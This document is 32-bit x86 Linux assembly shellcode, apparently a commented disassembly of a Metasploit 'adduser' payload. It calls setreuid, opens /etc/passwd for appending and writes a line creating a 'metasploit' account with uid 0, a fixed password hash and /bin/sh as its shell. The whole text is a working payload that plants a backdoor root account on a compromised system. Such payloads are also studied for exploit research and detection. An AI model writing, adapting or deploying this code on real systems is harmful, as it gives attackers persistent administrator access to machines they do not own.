global _start

section .text
_start:
    xor ecx,ecx     ; Clear ECX
    mov ebx,ecx     ; Clear EBX
    push byte +0x46 ; Load 0x46 (SETREUID)...
    pop eax         ; ...into EAX
    int 0x80        ; Exec interrupt
    push byte +0x5  ; Load 0x5 (OPEN)...
    pop eax         ; ...into EAX
    xor ecx,ecx     ; Clear ECX (flags = 0)
    push ecx        ; Push 0x0
    push dword 0x64777373   ; sswd
    push dword 0x61702f2f   ; //pa
    push dword 0x6374652f   ; /etc
    mov ebx,esp     ; Save pointer to path -> EBX
    inc ecx         ; ECX 0x0 -> 0x1
    mov ch,0x4      ; ECX 0x1 -> 0x401 (O_WRONLY|O_APPEND)
    int 0x80        ; Exec interrupt
    xchg eax,ebx    ; Save file descriptor -> EBX
    call LBL1       ; Jump +0x28 (LBL1)
    db "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh"
LBL1:
    pop ecx         ; Get address of string
    mov edx,[ecx-0x4]   ; Get length of string
    push byte +0x4  ; Load 0x4 (WRITE)...
    pop eax         ; ...into EAX
    int 0x80        ; Exec interrupt
    push byte +0x1  ; Load 0x1 (EXIT)...
    pop eax         ; ...into EAX
    int 0x80        ; Exec interrupt
